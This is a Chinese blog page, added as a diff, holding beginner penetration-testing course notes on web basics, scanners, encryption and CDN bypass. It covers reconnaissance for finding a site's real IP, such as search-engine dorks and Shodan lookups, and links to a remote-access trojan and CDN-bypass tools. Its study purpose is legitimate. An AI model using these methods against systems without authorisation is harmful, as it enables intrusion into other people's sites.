@@ -1,0 +1,3290 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+
+    
+    <title>渗透测试——XD_Web安全基础 | Kmoon</title>
+
+    <meta name="description" content="&lt;p&gt;小迪WEB安全基础入门学习&lt;/p&gt;">
+    <meta name="keywords" content="">
+
+    
+
+    <meta property="og:locale" content="cn" />
+    <meta property="og:type" content="article" />
+    <meta property="og:title" content= "渗透测试——XD_Web安全基础 | Kmoon"  />
+    <meta property="og:description" content= "&lt;p&gt;小迪WEB安全基础入门学习&lt;/p&gt;" />
+    <meta property="og:url" content="https://www.kmoon.fun/2022/xdsec/index.html" />
+    <meta property="og:site_name" content="" />
+    <meta property="article:author" content="Kmoon" />
+    <meta property="article:publisher" content="" />
+    <meta property="og:description" content="&lt;p&gt;小迪WEB安全基础入门学习&lt;/p&gt;" />
+    <meta name="twitter:title" content="渗透测试——XD_Web安全基础 | Kmoon"/>
+    <meta name="twitter:description" content="&lt;p&gt;小迪WEB安全基础入门学习&lt;/p&gt;"/>
+    <script type="application/ld+json">
+        {
+            "description": "&lt;p&gt;小迪WEB安全基础入门学习&lt;/p&gt;",
+            "author": { "@type": "Person", "name": "Kmoon" },
+            "@type": "BlogPosting",
+            "url": "https://www.kmoon.fun/2022/xdsec/index.html",
+            "publisher": {
+            "@type": "Organization",
+            "logo": {
+                "@type": "ImageObject",
+                "url": "https://www.kmoon.fun/image/avatar.png"
+            },
+            "name": "Kmoon"
+            },
+            "headline": "渗透测试——XD_Web安全基础 | Kmoon",
+            "datePublished": "2022-09-26T05:07:06.000Z",
+            "mainEntityOfPage": {
+                "@type": "WebPage",
+                "@id": "https://www.kmoon.fun/2022/xdsec/index.html"
+            },
+            "@context": "http://schema.org"
+        }
+    </script>
+
+
+
+
+    
+
+    
+    <meta property="algolia:search" data-application-id="8Z51BHYAUH" data-api-key="dbc9dafd607e95ea5aa312369120eabd" data-index-name="kmoon_blog">
+    
+
+    
+
+    
+
+    
+    <link rel="icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><text y=%22.9em%22 font-size=%2290%22>🌜️</text></svg>">
+    
+
+    
+
+    
+
+    
+<link rel="stylesheet" href="/dist/build.css?v=1654266144177.css">
+
+
+    
+<link rel="stylesheet" href="/dist/custom.css?v=1654266144177.css">
+
+
+    <script>
+        window.isPost = true
+        window.aomori = {
+            
+            
+            valine: {
+                enable: true,
+                appId: "i7G1tHcsR13KVa00grUUf6mr-gzGzoHsz",
+                appKey: "94N35fphXFiN5BGMNS9V5mHe",
+                placeholder: "Hello World!",
+                avatar: "",
+                pageSize: "10",
+                lang: "zh-CN",
+                visitor: false,
+                highlight: false,
+                recordIP: false,
+                emojiCDN: "",
+                enableQQ: false,
+                requiredFields: []
+            },
+            
+            
+        }
+        window.aomori_logo_typed_animated = true
+        window.aomori_search_algolia = true
+
+    </script>
+
+<meta name="generator" content="Hexo 6.3.0">
+<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
+<link rel="alternate" href="/atom.xml" title="Kmoon" type="application/atom+xml">
+</head>
+
+<body>
+
+    <div class="container">
+    <header class="header">
+        <div class="header-type">
+            
+            <div class="header-type-avatar avatar avatar-sm">
+                <img src="/image/avatar.png" alt="Kmoon">
+            </div>
+            
+            <div class="header-type-inner">
+                
+                    <div id="typed-strings" style="display:none">
+                        <p>Kmoon</p>
+                    </div>
+                    <a class="header-type-title" id="typed" href="/"></a>
+                
+    
+                
+            </div>
+        </div>
+        <div class="header-menu">
+            <div class="header-menu-inner">
+                
+                <a href="/">主页</a>
+                
+                <a href="/archives">归档</a>
+                
+                <a href="/friends">友链</a>
+                
+                <a href="/photography">摄影</a>
+                
+                <a href="/2022/10/about/">关于</a>
+                
+                <a href="/shenyuan">深渊</a>
+                
+                <a href="/wiki">Wiki</a>
+                
+            </div>
+            <div class="header-menu-social">
+                
+    <a class="social" target="_blank" href="https://github.com/kmoonn/">
+        <ion-icon name="logo-github"></ion-icon>
+    </a>
+
+    <a class="social" target="_blank" href="">
+        <ion-icon name="logo-wechat"></ion-icon>
+    </a>
+
+            </div>
+        </div>
+
+        <div class="header-menu-mobile">
+            <div class="header-menu-mobile-inner" id="mobile-menu-open">
+                <i class="icon icon-menu"></i>
+            </div>
+        </div>
+    </header>
+
+    <div class="header-menu-mobile-menu">
+        <div class="header-menu-mobile-menu-bg"></div>
+        <div class="header-menu-mobile-menu-wrap">
+            <div class="header-menu-mobile-menu-inner">
+                <div class="header-menu-mobile-menu-close" id="mobile-menu-close">
+                    <i class="icon icon-cross"></i>
+                </div>
+                <div class="header-menu-mobile-menu-list">
+                    
+                    <a href="/">主页</a>
+                    
+                    <a href="/archives">归档</a>
+                    
+                    <a href="/friends">友链</a>
+                    
+                    <a href="/photography">摄影</a>
+                    
+                    <a href="/2022/10/about/">关于</a>
+                    
+                    <a href="/shenyuan">深渊</a>
+                    
+                    <a href="/wiki">Wiki</a>
+                    
+                </div>
+            </div>
+        </div>
+    </div>
+
+</div>
+
+    <div class="container">
+        <div class="main">
+            <section class="inner">
+                <section class="inner-main">
+                    <div class="post">
+    <article id="post-cl9uyvfr1000dbwvmgg5ydhlh" class="article article-type-post" itemscope
+    itemprop="blogPost">
+
+    <div class="article-inner">
+
+        
+          
+        
+        
+        
+
+        
+        <header class="article-header">
+            
+  
+    <h1 class="article-title" itemprop="name">
+      渗透测试——XD_Web安全基础
+    </h1>
+  
+
+        </header>
+        
+
+        <div class="article-more-info article-more-info-post hairline">
+
+            <div class="article-date">
+  <time datetime="2022-09-26T05:07:06.000Z" itemprop="datePublished">2022-09-26</time>
+</div>
+
+            
+            <div class="article-category">
+                <a class="article-category-link" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a>
+            </div>
+            
+
+            
+            <div class="article-tag">
+                <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Sec/" rel="tag">Sec</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web%E5%AE%89%E5%85%A8/" rel="tag">web安全</a></li></ul>
+            </div>
+            
+
+            
+            <div class="article-busuanzi">
+                <span id="busuanzi_value_page_pv">N</span> 人看过
+            </div>
+            
+
+        </div>
+
+        <div class="article-entry post-inner-html hairline" itemprop="articleBody">
+            <p>小迪WEB安全基础入门学习</p>
+<span id="more"></span>
+
+<h3 id="DAY-1-基础入门-概念名词"><a href="#DAY-1-基础入门-概念名词" class="headerlink" title="DAY-1 基础入门-概念名词"></a>DAY-1 基础入门-概念名词</h3><p>2022年7月9日</p>
+<ul>
+<li><ul>
+<li>域名</li>
+</ul>
+</li>
+<li>www 顶级域名</li>
+<li>二级域名</li>
+<li>多级域名</li>
+<li>Ping命令：ping  IP地址</li>
+<li>域名在哪里注册？</li>
+<li>域名发现对于安全测试意义？</li>
+<li><ul>
+<li>DNS</li>
+</ul>
+</li>
+<li>域名系统（服务）协议：解析域名-IP地址</li>
+<li>HOSTS文件</li>
+<li>设置IP与域名的解析对应关系</li>
+<li>优先访问hosts文件</li>
+<li>CDN  是什么？与 DNS 的关系？</li>
+<li>内容分布网络 缓存节点技术</li>
+<li>刷新DNS缓存命令：ipconfig /flushdns</li>
+<li>常见的 DNS 安全攻击：DNS劫持 DNS污染</li>
+<li><ul>
+<li>脚本语言</li>
+</ul>
+</li>
+<li>常见的脚本语言类型</li>
+<li>asp  php aspx jsp javaweb pl py cgi等</li>
+<li>不同脚本类型与安全漏洞的关系？</li>
+<li>漏洞挖掘代码审计与脚本类型的关系？</li>
+<li><ul>
+<li>后门</li>
+</ul>
+</li>
+<li>什么是后门？有那些后门？</li>
+<li>后门在安全测试中的实际意义？</li>
+<li>关于后门需要了解那些？（玩法，免杀）</li>
+<li><ul>
+<li>WEB</li>
+</ul>
+</li>
+<li>WEB  的组成架构模型？</li>
+<li>网站源码：分脚本类型，分应用方向</li>
+<li>操作系统：windows linux</li>
+<li>中间件（搭建平台）：apache iis tomcat nginx 等</li>
+<li>数据库：access mysql mssql oracle sybase db2 postsql  等</li>
+<li>架构漏洞安全测试简要介绍？</li>
+<li>为什么要从 WEB 层面为主为首？</li>
+<li><ul>
+<li>WEB  相关安全漏洞</li>
+</ul>
+</li>
+<li>WEB  源码类对应漏洞</li>
+<li>SQL  注入，上传，XSS，代码执行，变量覆盖，逻辑漏洞，反序列化等</li>
+<li>WEB  中间件对应漏洞</li>
+<li>WEB  数据库对应漏洞</li>
+<li>WEB  系统层对应漏洞</li>
+<li>其他第三方对应漏洞</li>
+<li>APP 或 PC 应用结合类：小程序 公众号 APP</li>
+<li></li>
+<li><ul>
+<li>演示案例：</li>
+</ul>
+</li>
+<li>Ø  多级域名的枚举查找（原理，方式）</li>
+<li>Ø  DNS解析修改后分析（本地或服务）</li>
+<li>Ø  EXE后门功能及危害及类似 WEB 后门</li>
+<li>Ø  APP 类结合 WEB 协议，PC 类结合 WEB 协议</li>
+<li></li>
+<li><ul>
+<li>涉及资源：</li>
+</ul>
+</li>
+<li><a href="https://github.com/quasar/QuasarRAT/releases">https://github.com/quasar/QuasarRAT/releases</a></li>
+</ul>
+<h3 id="DAY-2-基础入门-数据包扩展"><a href="#DAY-2-基础入门-数据包扩展" class="headerlink" title="DAY-2 基础入门-数据包扩展"></a>DAY-2 基础入门-数据包扩展</h3><p>2022年7月13日</p>
+<p>11:22</p>
+<ul>
+<li><ul>
+<li>网站解析对应</li>
+</ul>
+</li>
+<li><p>#简要网站搭建过程</p>
+</li>
+<li><p>涉及到的攻击层面？（源码，搭建平台，系统，网络层等）</p>
+</li>
+<li><p>涉及到的安全问题？（目录，敏感文件，弱口令，IP 及域名等）</p>
+</li>
+<li></li>
+<li><ul>
+<li>HTTP/S 数据包</li>
+</ul>
+</li>
+<li><p>#HTTP/HTTPS 具体区别？</p>
+</li>
+<li><p>https多一层：SSL或者TLS 加密协议 证书 </p>
+</li>
+<li><p>#HTTP  简要通信过程</p>
+</li>
+<li><p>建立连接——&gt;发送请求数据包——&gt;返回响应数据包——&gt;关闭连接</p>
+</li>
+<li><p>1.浏览器建立与 web 服务器之间的连接</p>
+</li>
+<li><p>2.浏览器将请求数据打包（生成请求数据包）并发送到 web 服务器</p>
+</li>
+<li><p>3.web  服务器将处理结果打包（生成响应数据包）并发送给浏览器</p>
+</li>
+<li><p>4.web  服务器关闭连接</p>
+</li>
+<li></li>
+<li><p>#HTTPS 简要通信过程（见图）</p>
+</li>
+<li></li>
+<li><ul>
+<li>Request 请求数据包数据格式</li>
+</ul>
+</li>
+<li><p>#Request 请求数据包数据格式</p>
+</li>
+<li><p>1.请求行：请求类型/请求资源路径、协议的版本和类型</p>
+</li>
+<li><p>2.请求头：一些键值对，浏览器与 web 服务器之间都可以发送，特定的某种含义</p>
+</li>
+<li><p>3.空行：请求头与请求体之间用一个空行隔开；</p>
+</li>
+<li><p>4.请求体：要发送的数据(一般 post 提交会使用)；例：user=123&amp;pass=123 </p>
+<h3 id="请求行"><a href="#请求行" class="headerlink" title="请求行"></a>请求行</h3></li>
+<li><p>请求行由三个标记组成：<strong>请求方法、请求</strong>  <strong>URL</strong> <strong>和</strong>  <strong>HTTP</strong> <strong>版本</strong>，它们用空格分开。</p>
+</li>
+<li><p>例如：GET /index.html HTTP/1.1</p>
+</li>
+<li><ul>
+<li>HTTP 规划定义了 8 种可能的请求方法： </li>
+<li>GET：检索 URL 中标识资源的一个简单请求 </li>
+<li>HEAD：与 GET 方法相同，服务器只返回状态行和头标，并不返回请求文档 </li>
+<li>POST：服务器接受被写入客户端输出流中的数据的请求 </li>
+<li>PUT：服务器保存请求数据作为指定 URL 新内容的请求 </li>
+<li>DELETE：服务器删除 URL 中命令的资源的请求 </li>
+<li>OPTIONS：关于服务器支持的请求方法信息的请求 </li>
+<li>TRACE：web 服务器反馈 Http 请求和其头标的请求 </li>
+<li>CONNECT ：已文档化，但当前未实现的一个方法，预留做隧道处理</li>
+</ul>
+</li>
+<li><h1 id="请求头"><a href="#请求头" class="headerlink" title="#请求头"></a>#请求头</h1></li>
+<li><p>由关键字/值对组成，每行一对，关键字和值用冒号分享。请求头标通知服务器腾于客户端的功能和标识。</p>
+</li>
+<li><ul>
+<li>HOST: 主机或域名地址 </li>
+<li>Accept：指浏览器或其他客户可以接爱的 MIME 文件格式。Servlet 可以根据它判断并返回适当的文件格式。 </li>
+<li>User-Agent：是客户浏览器名称 </li>
+<li>Host：对应网址 URL 中的 Web 名称和端口号。 </li>
+<li>Accept-Langeuage：指出浏览器可以接受的语言种类，如 en 或 en-us，指英语。 </li>
+<li>connection：用来告诉服务器是否可以维持固定的 HTTP 连接。http 是无连接的，HTTP/1.1 使用 Keep-Alive为默认值，这样，当浏览器需要多个文件时(比如一个 HTML 文件和相关的图形文件)，不需要每次都建立连接 </li>
+<li>Cookie：浏览器用这个属性向服务器发送 Cookie。Cookie 是在浏览器中寄存的小型数据体，它可以记和和服务器相关的用户信息，也可以用来实现会话功能。 </li>
+<li><strong>Referer</strong>  ： 表明产生请求的网页URL.如比从网页 /icconcept/index.jsp  中 点 击 一 个 链 接 到 网  页/icwork/search ， 在 向 服 务 器 发  送 的  GET/icwork/search 中 的 请 求 中 ， Referer 是<a href="http://hostname:8080/icconcept/index.jsp%E3%80%82%E8%BF%99%E4%B8%AA%E5%B1%9E%E6%80%A7%E5%8F%AF%E4%BB%A5%E7%94%A8%E6%9D%A5%E8%B7%9F%E8%B8%AA">http://hostname:8080/icconcept/index.jsp。这个属性可以用来跟踪</a> Web 请求是从什么网站来的。 </li>
+<li>Content-Type：用来表名 request 的内容类型。可以用 HttpServletRequest 的 getContentType()方法取得。 </li>
+<li>Accept-Charset：指出浏览器可以接受的字符编码。英文浏览器的默认值是 ISO-8859-1. </li>
+<li>Accept-Encoding：指出浏览器可以接受的编码方式。编码方式不同于文件格式，它是为了压缩文件并加速文件传递速度。浏览器在接收到 Web 响应之后先解码，然后再检查文件格式。</li>
+</ul>
+</li>
+<li><p>#空行</p>
+</li>
+<li><p>最后一个请求头标之后是空行，发送回车符和退行，通知服务器以下不再有头标。</p>
+</li>
+<li><p>#请求数据</p>
+</li>
+<li><p>使用 POST 传送，最常使用的是 Content-Type 和 Content-Length 头标。</p>
+</li>
+<li></li>
+<li><ul>
+<li>Response 返回数据包数据格式</li>
+</ul>
+</li>
+<li><p>#Response 请求数据包数据格式</p>
+</li>
+<li><p>一个响应由四个部分组成；状态行、响应头标、空行、响应数据。</p>
+</li>
+<li><p>1.状态行：协议版本、数字形式的状态代码和状态描述，个元素之间以空格分隔</p>
+</li>
+<li><p>2.响应头标：包含服务器类型、日期、长度、内容类型等</p>
+</li>
+<li><p>3.空行：响应头与响应体之间用空行隔开</p>
+</li>
+<li><p>4.响应数据：浏览器会将实体内容中的数据取出来，生成相应的页面</p>
+</li>
+<li><p>#HTTP 响应码：</p>
+</li>
+<li><p>1xx：信息，请求收到，继续处理</p>
+</li>
+<li><p>2xx：成功，行为被成功地接受、理解和采纳</p>
+</li>
+<li><p>3xx：重定向，为了完成请求，必须进一步执行的动作</p>
+</li>
+<li><p>4xx：客户端错误</p>
+</li>
+<li><p>5xx：服务器错</p>
+</li>
+<li></li>
+<li><p>200 存在文件</p>
+</li>
+<li><p>403 存在文件夹</p>
+</li>
+<li><p>3xx 均可能存在</p>
+</li>
+<li><p>404 不存在文件及文件夹</p>
+</li>
+<li><p>500 均可能存在 </p>
+</li>
+<li><p><a href="https://www.mozhe.cn/">https://www.mozhe.cn/</a></p>
+</li>
+<li><p>NetType：微信内置访问的网络类型</p>
+</li>
+<li><p>改成POST请求方法后，需要将请求头加上content-type头标</p>
+</li>
+<li><p>x-forwarded-for：php验证ip地址</p>
+</li>
+</ul>
+<p>DAY-3 基础入门-搭建安全拓展</p>
+<p>2022年7月9日</p>
+<p>14:17</p>
+<ul>
+<li><ul>
+<li>涉及知识：</li>
+</ul>
+</li>
+<li><p>²  常见搭建平台脚本启用</p>
+</li>
+<li><p>²  域名 IP 目录解析安全问题</p>
+</li>
+<li><p>²  常见文件后缀解析对应安全</p>
+</li>
+<li><p>²  常见安全测试中的安全防护</p>
+</li>
+<li><p>² WEB  后门与用户及文件权限</p>
+</li>
+<li></li>
+<li><p>#ASP,PHP,ASPX,JSP,PY,JAVAWEB 等环境</p>
+</li>
+<li><p>#WEB  源码中敏感文件</p>
+</li>
+<li><p>后台路径，数据库配置文件，备份文件等</p>
+</li>
+<li><p>#IP  或域名解析 WEB 源码目录对应下的存在的安全问题</p>
+</li>
+<li><p>域名访问，IP 访问（结合类似备份文件目录）</p>
+</li>
+<li><p>#脚本后缀对应解析（其他格式可相同-上传安全）</p>
+</li>
+<li><p>#存在下载或为解析问题</p>
+</li>
+<li><p>#常见防护中的 IP 验证，域名验证等</p>
+</li>
+<li><p>#后门是否给予执行权限</p>
+</li>
+<li><p>#后门是否给予操作目录或文件权限</p>
+</li>
+<li><p>#后门是否给予其他用户权限</p>
+</li>
+<li><p>#总结下关于可能会存在的安全或防护问题？</p>
+</li>
+<li><ul>
+<li>演示案例：</li>
+</ul>
+</li>
+<li><p>Ø  基于中间件的简要识别</p>
+</li>
+<li><p>iis中间件安装</p>
+</li>
+<li><p>Ø  基于中间件的安全漏洞</p>
+</li>
+<li><p>Ø  基于中间件的靶场使用</p>
+</li>
+<li><ul>
+<li>涉及资源：</li>
+</ul>
+</li>
+<li><p><a href="https://www.vulhub.org/">https://www.vulhub.org/</a></p>
+</li>
+<li><p>Web  中间件常见漏洞总结，Vulhub 靶场</p>
+</li>
+</ul>
+<p>DAY-4 基础入门-WEB源码拓展</p>
+<p>2022年7月9日</p>
+<p>14:20</p>
+<ul>
+<li><ul>
+<li>知识点：</li>
+</ul>
+</li>
+<li>ü  关于 WEB 源码目录结构</li>
+<li>ü  关于 WEB 源码脚本类型</li>
+<li>ü  关于 WEB 源码应用分类</li>
+<li>ü  关于 WEB 源码其他说明</li>
+<li></li>
+<li>#数据库配置文件，后台目录，模版目录，数据库目录等</li>
+<li>#ASP,PHP,ASPX,JSP,JAVAWEB 等脚本类型源码安全问题</li>
+<li>#社交，论坛，门户，第三方，博客等不同的代码机制对应漏洞</li>
+<li>#开源，未开源问题，框架非框架问题，关于 CMS 识别问题及后续等</li>
+<li>#关于源码获取的相关途径：搜索，咸鱼淘宝，第三方源码站，各种行业对应</li>
+<li>#总结：</li>
+<li>关注应用分类及脚本类型估摸出可能存在的漏洞（其中框架类例外），在获取源码后可进行本地安全测试</li>
+<li>或代码审计，也可以分析其目录工作原理（数据库备份，bak 文件等），未获取到的源码采用各种方法想办法获取！</li>
+<li><ul>
+<li>演示案例：</li>
+</ul>
+</li>
+<li>Ø  ASP,PHP 等源码下安全测试</li>
+<li>平台识别-某 CMS 无漏洞-默认数据库</li>
+<li>平台识别-某 CMS 有漏洞-漏洞利用</li>
+<li>Ø  源码应用分类下的针对漏洞</li>
+<li>niushop 电商类关注漏洞点-业务逻辑</li>
+<li>Ø  简要目标从识别到源码获取</li>
+<li>本地演示个人博客-手工发现其 CMS-漏洞搜索或下载分析</li>
+<li><a href="http://weipan.1016sangshen.cn/">http://weipan.1016sangshen.cn/</a> 内部搭建的靶场</li>
+<li>人工爆框架-搜索特定 url-获取其他相符站点-漏洞测试</li>
+<li>借助特定行业源码或咸鱼进行搜索获取-本地搭建-代码审计或其他</li>
+<li><ul>
+<li>涉及资源：</li>
+</ul>
+</li>
+<li><a href="https://cnmmm.com/">https://cnmmm.com</a></li>
+<li><a href="https://www.yunsee.cn/">https://www.yunsee.cn</a></li>
+<li><a href="https://w.ddosi.workers.dev/">https://w.ddosi.workers.dev</a></li>
+<li><a href="http://whatweb.bugscaner.com/">http://whatweb.bugscaner.com</a></li>
+<li><a href="https://github.com/Lucifer1993/cmsprint">https://github.com/Lucifer1993/cmsprint</a></li>
+<li><a href="https://github.com/M4tir/Github-Monitor">https://github.com/M4tir/Github-Monitor</a></li>
+<li><a href="https://websec.readthedocs.io/zh/latest/language/index.html">https://websec.readthedocs.io/zh/latest/language/index.html</a></li>
+<li>另外还有 windows 靶机集合部分源码，在群文件靶机目录下载文本文</li>
+</ul>
+<p>DAY-5 基础入门-系统及数据库</p>
+<p>2022年7月16日</p>
+<p>13:55</p>
+<ul>
+<li><ul>
+<li>操作系统层面</li>
+</ul>
+</li>
+<li><h2 id="识别操作系统常见方法"><a href="#识别操作系统常见方法" class="headerlink" title="识别操作系统常见方法"></a>识别操作系统常见方法</h2></li>
+<li><p>1.Windows对大小写不敏感  Linux敏感</p>
+</li>
+<li><p>2.TTL值判断</p>
+</li>
+<li><p>3.nmap检测： nmap -O  IP地址</p>
+</li>
+<li><p>简要两者区别及识别意义</p>
+</li>
+<li><p>操作系统层面漏洞类型对应意义</p>
+</li>
+<li><p>简要操作系统层面漏洞影响范围</p>
+</li>
+<li></li>
+<li><ul>
+<li>数据库层面</li>
+</ul>
+</li>
+<li><p>识别数据库类型常见方法</p>
+</li>
+<li><p>扫描端口 nmap</p>
+</li>
+<li><p>数据库对应常用端口号</p>
+</li>
+<li></li>
+<li><p>数据库类型区别及识别意义</p>
+</li>
+<li><p>数据库常见漏洞类型及攻击</p>
+</li>
+<li><p>简要数据库层面漏洞影响范围</p>
+</li>
+<li></li>
+<li><ul>
+<li>第三方层面</li>
+</ul>
+</li>
+<li><p>如何判断有哪些第三方平台或软件</p>
+</li>
+<li><p>简要为什么要识别第三方平台或软件</p>
+</li>
+<li><p>常见第三方平台或软件漏洞类型及攻击</p>
+</li>
+<li><p>简要第三方平台或软件安全测试的范围</p>
+</li>
+<li></li>
+<li></li>
+<li><p>涉及资源：</p>
+</li>
+<li><p><a href="https://nmap.org/">https://nmap.org/</a></p>
+</li>
+</ul>
+<p>DAY-5 漏洞发现</p>
+<p>2022年7月9日</p>
+<p>14:32</p>
+<ul>
+<li>基于 WEB 应用扫描测试</li>
+</ul>
+<p>1.被动式扫描</p>
+<p>x-ray</p>
+<p><a href="https://xray.cool/xray/#/tutorial/introduce">https://xray.cool/xray/#/tutorial/introduce</a></p>
+<p>Github: <a href="https://github.com/chaitin/xray/releases">https://github.com/chaitin/xray/releases</a> （国外速度快）</p>
+<p>网盘: <a href="https://yunpan.360.cn/surl_y3Gu6cugi8u">https://yunpan.360.cn/surl_y3Gu6cugi8u</a> （国内速度快）</p>
+<p>2.主动式扫描</p>
+<p>awvs netsparker  appscan</p>
+<p>注意验证后扫描</p>
+<p>无验证码：模拟登陆</p>
+<p>有验证码：带入 cookie</p>
+<ul>
+<li>基于操作系统扫描测试</li>
+</ul>
+<p>Nessus</p>
+<p>Openvas</p>
+<p>Goby</p>
+<ul>
+<li>基于 NMAP 使用扫描测试</li>
+</ul>
+<p><a href="https://blog.csdn.net/qq_29277155/article/details/50977143">https://blog.csdn.net/qq_29277155/article/details/50977143</a></p>
+<ul>
+<li>其他安全漏洞扫描补充</li>
+</ul>
+<p>未授权访问</p>
+<p>中间件安全</p>
+<p>逻辑越权问题</p>
+<p>更多安全扫描见：</p>
+<p><a href="https://www.uedbox.com/tools/type/scanner/">https://www.uedbox.com/tools/type/scanner/</a></p>
+<p>注意：部分漏洞（越权）利用工具无法探针，只能手工</p>
+<p>注：当使用  burpsuite 来抓模拟</p>
+<p>器的 app  报文时，抓到数据包里的网址，用浏览</p>
+<p>器访问时，可能会出现某些问题，这时可以参考</p>
+<p>正确的报文（可以在浏览器的  network 里查看正</p>
+<p>确的报文结构）进行修改。当我们使用</p>
+<p>burpsuite  抓到 app 的地址时，使用 awvs 来进行</p>
+<p>扫描，要用到自定义扫描，添加信息（可能是头</p>
+<p>部，类似于上面需要构造正确的报文才能进行访</p>
+<p>问），才能进行正确扫</p>
+<p>DAY-6 基础入门-加密编码算法</p>
+<p>2022年7月9日</p>
+<p>14:36</p>
+<ul>
+<li><ul>
+<li>#常见加密编码等算法解析</li>
+</ul>
+</li>
+<li><p>MD5，SHA，ASC，进制，时间戳，URL，BASE64，Unescape，AES，DES 等</p>
+</li>
+<li><ul>
+<li>#常见加密形式算法解析6</li>
+</ul>
+</li>
+<li><p>直接加密，带 salt，带密码，带偏移，带位数，带模式，带干扰，自定义组合等</p>
+</li>
+<li><ul>
+<li>#常见解密方式（针对）</li>
+</ul>
+</li>
+<li><p>枚举，自定义逆向算法，可逆向</p>
+</li>
+<li><ul>
+<li>#了解常规加密算法的特性</li>
+</ul>
+</li>
+<li><p>长度位数，字符规律，代码分析，搜索获取等</p>
+</li>
+<li><ul>
+<li>演示案例：</li>
+</ul>
+</li>
+<li><p>²  某 CTF 比赛题目解析</p>
+</li>
+<li><p>#脚本自定义算法组合逆向</p>
+</li>
+<li><p>²  某 CMS 密码加密解密</p>
+</li>
+<li><p>#MD5+salt</p>
+</li>
+<li><p>#部分 CMS 密码加密形式-wp,dz 等</p>
+</li>
+<li><p>²  某 URL 加密地址的漏洞测试</p>
+</li>
+<li><p>#AES+Base64+自定义</p>
+</li>
+<li><p>#观察参数值加密字符串，下载源代码分析，函数定义 AES 加密，涉及模式 CBC,128 位，加密密码，偏移</p>
+</li>
+<li><p>量，两次 base64 减去常规一次，填充模式。（_mozhe）</p>
+</li>
+<li><p>ZUlJOGMzSmVMMHQwZHhNN3diM056Zz09</p>
+</li>
+<li><p>eII8c3JeL0t0dxM7wb3Nzg==</p>
+</li>
+<li><p>²  某实际应用 URL 地址参数加密</p>
+</li>
+<li><p>#搜素特定关键字加密字符串</p>
+</li>
+<li></li>
+<li><p>涉及资源：</p>
+</li>
+<li><p><a href="https://www.mozhe.cn/">https://www.mozhe.cn</a></p>
+</li>
+<li><p><a href="https://www.cmd5.com/">https://www.cmd5.com</a></p>
+</li>
+<li><p><a href="http://tool.chacuo.net/cryptaes">http://tool.chacuo.net/cryptaes</a></p>
+</li>
+<li><p><a href="https://ctf.bugku.com/challenges">https://ctf.bugku.com/challenges</a></p>
+</li>
+<li><p><a href="https://www.cr173.com/soft/21692.html">https://www.cr173.com/soft/21692.html</a></p>
+</li>
+<li><p><a href="https://gitee.com/ComsenzDiscuz/DiscuzX">https://gitee.com/ComsenzDiscuz/DiscuzX</a></p>
+</li>
+</ul>
+<p>DAY-7 信息收集-CDN绕过</p>
+<p>2022年7月9日</p>
+<p>14:39</p>
+<p>CDN  的全称是 Content Delivery Network，即内容分发网络。</p>
+<p>CDN  是构建在现有网络基础之上的智能虚拟网络，依靠部署在各地的边缘服务器，</p>
+<p>通过中心平台的负载均衡、内容分发、调度等功能模块，<strong>使用户就近获取所</strong></p>
+<p><strong>需内容，降低网络拥塞，提高用户访问响应速度和命中率</strong>。但在安全测试过</p>
+<p>程中，若目标存在 CDN 服务，将会影响到后续的安全测试过程。</p>
+<ul>
+<li>如何判断目标存在 CDN 服务？</li>
+</ul>
+<p>利用<strong>多节点技术</strong>进行请求返回判断</p>
+<p>全球ping返回不同的IP地址——说明存在CDN</p>
+<p>多个地点ping服务器： <a href="https://ping.chinaz.com/">https://ping.chinaz.com/</a></p>
+<p><img src="/file6280.files/image002.png" alt="img"></p>
+<ul>
+<li>CDN 绕过</li>
+</ul>
+<ol>
+<li>子域名查询</li>
+</ol>
+<p>例如：news.baidu.com</p>
+<ol>
+<li>邮件服务查询</li>
+</ol>
+<p>内部邮箱服务器</p>
+<ol>
+<li>国外地址请求</li>
+</ol>
+<p>一般不在国外访问时设置CDN节点</p>
+<ol>
+<li>遗留文件，扫描全网</li>
+</ol>
+<p>phpinfo.php文件</p>
+<p>inurl:phpinfo.php</p>
+<ol>
+<li>黑暗引擎搜索特定文件</li>
+</ol>
+<p>shodan、zoomeye、fofa</p>
+<ol>
+<li>DNS  历史记录，以量打量</li>
+</ol>
+<ul>
+<li>CDN 真实 IP 地址获取后绑定指向地址</li>
+</ul>
+<p>更改本地 HOSTS 解析指向文件</p>
+<ul>
+<li>演示案例：</li>
+</ul>
+<p>²  利用子域名请求获取真实 IP</p>
+<p>²  利用国外地址请求获取真实 IP</p>
+<p>²  利用第三方接口查询获取真实 IP</p>
+<p>²  利用邮件服务器接口获取真实 IP</p>
+<p>²  利用黑暗引擎搜索特定文件获取真实 IP</p>
+<p>xueersi 子域名上面的小技巧</p>
+<p>Ping xueersi.com 没有CDN 一般默认<a href="http://www.xxx.com才会加cdn/">www.xxx.com才会加CDN</a></p>
+<p>sp910  DNS 历史记录=第三方接口（接口查询）</p>
+<p>m.sp910 子域名小技巧/采集/国外请求（同类型访问）</p>
+<p>mozhe  邮件源码测试对比第三方查询（地区分析）</p>
+<p>v23gg  黑暗引擎（shodan 搜指定 hash 文件）</p>
+<p>扫全网</p>
+<p>fuckcdn，w8fuckcdn，zmap 等</p>
+<p>涉及资源：</p>
+<p><a href="https://www.shodan.io/">https://www.shodan.io</a></p>
+<p><a href="https://asm.ca.com/en/ping.php">https://asm.ca.com/en/ping.php</a></p>
+<p><a href="https://github.com/Tai7sy/fuckcdn">https://github.com/Tai7sy/fuckcdn</a></p>
+<p><a href="https://github.com/boy-hack/w8fuckcdn">https://github.com/boy-hack/w8fuckcdn</a></p>
